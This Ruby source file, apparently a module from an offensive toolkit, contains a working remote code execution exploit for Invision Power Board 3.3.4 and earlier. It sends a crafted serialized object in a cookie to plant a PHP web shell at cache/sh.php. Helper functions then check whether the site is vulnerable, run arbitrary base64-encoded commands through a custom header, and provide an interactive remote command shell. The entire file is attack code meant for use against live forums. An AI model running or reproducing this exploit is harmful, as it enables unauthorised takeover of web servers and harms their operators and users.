# Known to have a few bugs, this is the area to place your checks and exploits for IPB....
# Invision PowerBoard a.k.a IPB or I.P.B
# It is a CMS & Forum Software written in PHP...

# IPB <= 3.3.4 Unserialized RCE
# Dangerous misuse of deserialize()
# Content passed via cookie run through this function
# Results in Remote COmmand Executation capabilities...
# Returns True on success, false otherwise...
def ipb_unserialized_rce_check(site)
  http=EasyCurb.new
  i = '/index.php'
  link = site.sub(/\/$/, '') + i

  # Check Site is up...
  res = http.get(link)
  if res[3] =~ /Server: (.+)/i
    server_info = $1.chomp
  end
  if not server_info.nil? and server_info != ''
    if server_info =~ /IIS|Windows|Win32|Win64|\.NET/i
      os='Windows' # Windows
    else
      os='Linux' # Likely Not Windows
    end
  else
    os='Unknown'
  end
  cookies=[]
  res[3].split("\n").each do |line|
    if line =~ /Set-cookie: (.+);/i
     cookies << $1.chomp
    end
  end
  # Check site is up...
  if res[1] == 200 or res[1] == 301
    print_status("Confirmed site is up")
    puts "   [".light_blue + "+".white + "] ".light_blue + "OS: #{os}".white unless os.nil?
    puts "   [".light_blue + "+".white + "] ".light_blue + "Cookies:\n   #{cookies[0].to_s}".white unless cookies.nil?
    print_status("Running vuln checks now.....")
  else
    puts
    print_error("Site doesn't seem to be up!")
    print_error("Double check URL path to forum and try again or check manually....\n\n")
    return false
  end
  # Serialized Magic String
  # If we change the file write payload path/filename
  # Then we need to ensure we set the string length value as well or will break injection
  # s:12:"cache/sh.php"; => s:32:"cache/../../images/foofucked.php"; <= notice the 's' value change....
  payload = URI.encode('a:1:{i:0;O:+15:"db_driver_mysql":1:{s:3:"obj";a:2:{s:13:"use_debug_log";i:1;s:9:"debug_log";s:12:"cache/sh.php";}}}');

  # Our Simple PHP Shell we write to above string location
  # Takes Commands from CMD Header, base64 decodes and then runs...
  phpcode = '<?error_reporting(0);print(___);passthru(base64_decode($_SERVER[HTTP_CMD]));die;?>';
  injection = link + '?' + phpcode
  follow_up = link.sub('index.php', 'cache/sh.php')
  replace=false
  if not $config['HTTP']['HTTP_HEADERS_ADD']
    replace=true
    $config['HTTP']['HTTP_HEADERS_ADD'] = true
  end
  $config['HTTP']['HTTP_HEADERS'].store('Cookie', "member_id=#{payload}")
  print_status("Attempting to trigger exploit....")
  # Send the injection request...
  res = http.get(injection)
  if replace
    $config['HTTP']['HTTP_HEADERS_ADD'] = false
  end
  # Remove member_id Cookie from our headers global config
  $config['HTTP']['HTTP_HEADERS'].delete 'Cookie'
  if res[1] == 200 or res[1] == 301
    print_status("Site seems to be accepting injection, confirming now.... ")
    replace=false
    if not $config['HTTP']['HTTP_HEADERS_ADD']
      replace=true
      $config['HTTP']['HTTP_HEADERS_ADD'] = true
    end
    if os == 'Windows'
      $config['HTTP']['HTTP_HEADERS'].store('CMD', "J3dob2FtaSc=")
    else
      $config['HTTP']['HTTP_HEADERS'].store('CMD', "J2lkJw==")
    end
    # Send the injection request...
    res = http.get(follow_up)
    if replace
      $config['HTTP']['HTTP_HEADERS_ADD'] = false
    end
    # Remove member_id Cookie from our headers global config
    $config['HTTP']['HTTP_HEADERS'].delete 'Cookie'
    if res[1] == 200
      print_good("Site appears to be vulnerable!")
      if res[0] =~ /___(.*)\s/
        print_good("ID: #{$1.chomp}")
      end
      return true
    else
      print_error("Doesn't seem to be working, No results found!")
      print_error("Double check URL path and try again or check manually....\n\n")
      return false
    end
  else
    puts
    print_error("Doesn't seem to be working!")
    print_error("Double check URL path and try again or check manually....\n\n")
    return false
  end
end

def ipb_unserialized_rce_cmd(site, command)
  http=EasyCurb.new
  i = '/index.php'
  link = site.sub(/\/$/, '') + i
  payload = URI.encode('a:1:{i:0;O:+15:"db_driver_mysql":1:{s:3:"obj";a:2:{s:13:"use_debug_log";i:1;s:9:"debug_log";s:12:"cache/sh.php";}}}');
  phpcode = '<?error_reporting(0);print(___);passthru(base64_decode($_SERVER[HTTP_CMD]));die;?>';
  injection = link + '?' + phpcode
  follow_up = link.sub('index.php', 'cache/sh.php')
  replace=false
  if not $config['HTTP']['HTTP_HEADERS_ADD']
    replace=true
    $config['HTTP']['HTTP_HEADERS_ADD'] = true
  end
  $config['HTTP']['HTTP_HEADERS'].store('Cookie', "member_id=#{payload}")
  # Send the injection request...
  res = http.get(injection)
  if replace
    $config['HTTP']['HTTP_HEADERS_ADD'] = false
  end
  # Remove member_id Cookie from our headers global config
  $config['HTTP']['HTTP_HEADERS'].delete 'Cookie'
  if res[1] == 200 or res[1] == 301
    replace=false
    if not $config['HTTP']['HTTP_HEADERS_ADD']
      replace=true
      $config['HTTP']['HTTP_HEADERS_ADD'] = true
    end
    $config['HTTP']['HTTP_HEADERS'].store('CMD', command.chomp.b64e.chomp.gsub("\n", ''))
    # Send the injection request...
    res = http.get(follow_up)
    if replace
      $config['HTTP']['HTTP_HEADERS_ADD'] = false
    end
    # Remove member_id Cookie from our headers global config
    $config['HTTP']['HTTP_HEADERS'].delete 'Cookie'
    if res[1] == 200
      result = 'Command appears to have been run, but no result....'
      if res[0] =~ /___(.*)\s/m
        result = $1.chomp
      end
      return result
    else
      return nil
    end
  else
    return nil
  end
end

def ipb_unserialized_rce_shell(site)
 puts
  prompt = "(Command)> "
  http=EasyCurb.new
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      puts
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to previous menu....")
      break
    else
      results = ipb_unserialized_rce_cmd(site, cmd)
      if results.nil?
        print_error("No results found!")
        print_error("Check syntax and try again if expecting results....\n\n")
      else
        print_line("#{results.chomp}\n")
      end
    end
  end
end

